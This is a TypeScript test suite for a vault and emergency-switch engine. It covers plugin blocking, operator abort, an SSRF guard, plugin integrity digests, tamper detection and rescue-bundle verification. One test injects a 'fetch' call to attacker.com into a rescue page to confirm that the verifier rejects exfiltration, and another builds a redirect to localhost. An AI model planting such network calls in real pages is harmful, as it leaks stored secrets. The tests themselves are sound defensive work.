import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { normalizeAndValidateConfig } from '../src/config/loader.ts';
import { OboldDatabase } from '../src/db/database.ts';
import { OboldEngine } from '../src/core/engine.ts';
import { OboldCipher } from '../src/crypto/cipher.ts';
import { PluginRegistry } from '../src/plugins/registry.ts';
import { fetchWithSsrfGuard } from '../src/plugins/network-guard.ts';
import { unlinkSync, existsSync } from 'node:fs';
import { resolve } from 'node:path';

const TEST_DB = './data/test_contracts_abort.db';

function cleanupDb() {
  try {
    if (existsSync(TEST_DB)) unlinkSync(TEST_DB);
    if (existsSync(`${TEST_DB}-wal`)) unlinkSync(`${TEST_DB}-wal`);
    if (existsSync(`${TEST_DB}-shm`)) unlinkSync(`${TEST_DB}-shm`);
  } catch {}
}

describe('Execution Contracts & Emergency Cascade Abort', () => {
  let db: OboldDatabase | null = null;
  let engine: OboldEngine | null = null;
  let cipher: OboldCipher;
  let plugins: PluginRegistry;

  beforeEach(() => {
    cleanupDb();
    db = new OboldDatabase(TEST_DB, true);
    cipher = new OboldCipher('contracts_abort_secret_key_32b!', 'chacha20-poly1305');
    plugins = new PluginRegistry();

    const config = normalizeAndValidateConfig({
      version: '1.0.0',
      storage: { path: TEST_DB },
      crypto: { algorithm: 'chacha20-poly1305', keyDerivation: 'scrypt' },
      server: { enabled: true, host: '127.0.0.1', port: 8080 },
      switches: [
        {
          id: 'vault-cascade',
          name: 'Cascade Vault',
          interval: '1h',
          gracePeriod: '10m',
          stages: [
            {
              id: 'stg-1',
              name: 'Stage 1 Warning',
              delay: '0s',
              actions: [
                {
                  id: 'act-unregistered',
                  plugin: 'core:unregistered_plugin_xyz',
                  config: { key: 'val' },
                },
              ],
            },
          ],
        },
      ],
    });

    engine = new OboldEngine(config, db, cipher, plugins);
  });

  afterEach(() => {
    if (db) {
      db.close();
      db = null;
    }
    cleanupDb();
  });

  it('Marks ledger entry as BLOCKED_PLUGIN_MISSING and sets switch status to BLOCKED when a plugin is missing', async () => {
    if (!engine || !db) throw new Error('Engine or DB not initialized');

    await engine.triggerSwitch('vault-cascade', false);

    const sw = db.getSwitch('vault-cascade');
    expect(sw).not.toBeNull();
    expect(sw?.status).toBe('BLOCKED');

    const ledgerEntries = db.getRecentLedgerEntries(10);
    expect(ledgerEntries.length).toBeGreaterThan(0);
    const missingEntry = ledgerEntries.find((e) => e.plugin === 'core:unregistered_plugin_xyz');
    expect(missingEntry).not.toBeUndefined();
    expect(missingEntry?.state).toBe('BLOCKED_PLUGIN_MISSING');
    expect(missingEntry?.lastError).toContain('is not registered or unavailable');
  });

  it('Halts execution cascade immediately when abortSwitch is called', () => {
    if (!engine || !db) throw new Error('Engine or DB not initialized');

    const ok = engine.abortSwitch('vault-cascade', 'Operator emergency abort');
    expect(ok).toBe(true);

    const sw = db.getSwitch('vault-cascade');
    expect(sw?.status).toBe('ABORTED');

    const logs = db.getAuditLogs(10, 'vault-cascade');
    const abortLog = logs.find((l) => l.category === 'EMERGENCY_ABORT');
    expect(abortLog).not.toBeUndefined();
    expect(abortLog?.message).toContain('Operator emergency abort');
  });

  it('SSRF Guard blocks redirect chains targeting localhost or private IPs', async () => {
    const mockServer = Bun.serve({
      port: 0,
      fetch(req) {
        const url = new URL(req.url);
        if (url.pathname === '/redirect-to-private') {
          return new Response(null, {
            status: 302,
            headers: { Location: 'http://127.0.0.1:8080/admin' },
          });
        }
        return new Response('ok', { status: 200 });
      },
    });

    try {
      const target = `http://127.0.0.1:${mockServer.port}/redirect-to-private`;
      await expect(
        fetchWithSsrfGuard(target, {}, false)
      ).rejects.toThrow(/Blocked private\/link-local SSRF network destination|Blocked localhost/);
    } finally {
      mockServer.stop();
    }
  });

  it('Computes dynamic SHA256 plugin integrity digests and reports dynamic versions', () => {
    const defaultRegistry = require('../src/plugins/registry.ts').createDefaultPluginRegistry();
    const pluginsList = defaultRegistry.list();

    expect(pluginsList.length).toBeGreaterThanOrEqual(13);
    for (const p of pluginsList) {
      expect(p.version).toBeDefined();
      expect(p.digest).toMatch(/^[a-f0-9]{64}$/);
    }
  });

  it('Executes immutable frozen plan from SQLite when active memory config has been modified', async () => {
    if (!engine || !db) throw new Error('Engine or DB not initialized');

    let executedPlugin = '';
    plugins.register({
      id: 'core:unregistered_plugin_xyz',
      name: 'Original Frozen Plugin',
      description: 'Test',
      version: '1.0.0',
      validateConfig: () => ({ valid: true }),
      execute: async () => {
        executedPlugin = 'core:unregistered_plugin_xyz';
        return { success: true, actionId: 'act-1', plugin: 'core:unregistered_plugin_xyz', durationMs: 5 };
      },
    });

    plugins.register({
      id: 'core:tampered_plugin',
      name: 'Tampered Plugin',
      description: 'Test',
      version: '1.0.0',
      validateConfig: () => ({ valid: true }),
      execute: async () => {
        executedPlugin = 'core:tampered_plugin';
        return { success: true, actionId: 'act-1', plugin: 'core:tampered_plugin', durationMs: 5 };
      },
    });

    const swConfig = (engine as any).config.switches.find((s: any) => s.id === 'vault-cascade');
    swConfig.stages[0].actions[0].plugin = 'core:tampered_plugin';

    await engine.triggerSwitch('vault-cascade', false);

    expect(executedPlugin).toBe('core:unregistered_plugin_xyz');

    const logs = db.getAuditLogs(10, 'vault-cascade');
    const mismatchLog = logs.find((l) => l.category === 'PLAN_HASH_MISMATCH');
    expect(mismatchLog).not.toBeUndefined();
  });

  it('Refuses to fall back to rogue .obold.key in current working directory', () => {
    const { getStableDefaultKeyPath } = require('../src/crypto/kdf.ts');
    const path = getStableDefaultKeyPath();
    expect(path).not.toContain(resolve(process.cwd(), '.obold.key'));
    expect(path).toMatch(/master\.key$/);
  });

  it('Verifies standalone rescue vault CSP compliance and rejects exfiltration scripts', () => {
    const { generateRescueBundle, verifyRescueBundle } = require('../src/crypto/rescue.ts');
    const bundle = generateRescueBundle({
      payload: 'TOP_SECRET_RECOVERY_KEY',
      threshold: 2,
      totalShares: 3,
    });

    const validResult = verifyRescueBundle(bundle.html);
    expect(validResult.valid).toBe(true);
    expect(bundle.html).toContain('Content-Security-Policy');

    const noCspHtml = bundle.html.replace(/<meta http-equiv="Content-Security-Policy"[^>]+>/, '');
    const noCspResult = verifyRescueBundle(noCspHtml);
    expect(noCspResult.valid).toBe(false);
    expect(noCspResult.error).toContain('Content-Security-Policy');

    const exfilHtml = bundle.html.replace('const vaultData', 'fetch("https://attacker.com"); const vaultData');
    const exfilResult = verifyRescueBundle(exfilHtml);
    expect(exfilResult.valid).toBe(false);
    expect(exfilResult.error).toMatch(/digest mismatch|Network communication/);
  });

  it('Verifies standalone rescue vault detached cryptographic signatures', () => {
    const { generateRescueBundle, generateRescueSignature, verifyRescueSignature } = require('../src/crypto/rescue.ts');
    const bundle = generateRescueBundle({
      payload: 'TOP_SECRET_RECOVERY_KEY',
      threshold: 2,
      totalShares: 3,
    });

    const secretKey = 'signing-key-secret-123';
    const sig = generateRescueSignature(bundle.html, secretKey);
    expect(sig).toBeDefined();
    expect(sig.length).toBe(64);

    const valid = verifyRescueSignature(bundle.html, sig, secretKey);
    expect(valid).toBe(true);

    const wrongKeyValid = verifyRescueSignature(bundle.html, sig, 'wrong-key');
    expect(wrongKeyValid).toBe(false);

    const tamperedValid = verifyRescueSignature(bundle.html + ' ', sig, secretKey);
    expect(tamperedValid).toBe(false);
  });
});
